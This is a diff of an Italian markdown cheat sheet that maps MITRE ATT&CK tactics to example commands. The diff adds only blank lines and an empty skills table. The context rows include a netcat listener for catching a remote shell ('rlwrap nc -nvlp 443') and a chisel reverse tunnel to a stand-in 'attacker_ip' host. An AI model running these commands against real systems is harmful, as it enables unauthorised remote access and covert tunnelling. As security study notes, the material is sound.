@@ -2,6 +2,7 @@
 
 Alcuni Comandi associati alla Matrice Mitre Att&Ck: 
 I numeri MITRE ATT&CK associati a queste tecniche possono variare a seconda della specifica implementazione e del contesto,
+
 | Tattica:                           | Numero/link:                                                                                                               | Es:                                                                                                   | Informazioni                                                                                                                         |
 | ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
 | Discovery:<br>(Reconnaissance)     | [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082)<br><br>                                   | `ping -c 1`                                                                                           | **ottenere** **informazioni** sul sistema operativo e sull'hardware ...                                                              |
@@ -13,3 +14,7 @@ I numeri MITRE ATT&CK associati a queste tecniche possono variare a seconda dell
 | Execution:                         | [T1059.001: Command and Scripting Interpreter: PowerShell, Sub-technique ](https://attack.mitre.org/techniques/T1059/001/) | `rlwrap nc -nvlp 443`                                                                                 | **stabilire la connessione**:<br>creazione di una shell remota,<br>                                                                  |
 | Discovery:                         | [T1016: System Network Configuration Discovery, Technique](https://attack.mitre.org/techniques/T1016/)                     | `ipconfig`                                                                                            |                                                                                                                                      |
 | Command & Control/Proxy:           | [T1090.003: Proxy: Multi-hop Proxy, Sub-technique](https://attack.mitre.org/techniques/T1090/003/)                         | `chisel client attacker_ip:8000 R:8080:127.0.0.1:80`<br><br>`chisel server --reverse --port 8000`<br> |                                                                                                                                      |
+
+
+| Skill                                         | Associated Project         |
+|-----------------------------------------------|----------------------------|
